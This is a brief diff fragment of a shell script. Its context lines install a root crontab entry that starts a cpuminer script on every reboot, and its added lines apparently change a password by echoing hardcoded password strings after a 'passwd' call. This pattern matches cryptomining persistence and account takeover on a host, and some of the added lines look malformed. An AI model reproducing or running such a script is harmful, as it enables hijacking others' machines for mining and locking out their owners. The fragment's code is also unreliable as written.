@@ -17,3 +17,8 @@ sudo crontab -l > mycron
 echo "@reboot /root/cpuminer-opt/zzzz.sh" >> mycron
 crontab mycron
 rm mycron
+output "";
+output "passwd"
+echo "Zxcv1234@@@@"
+echo "Abcg145!@#"
+echo "Abcg145!@#"
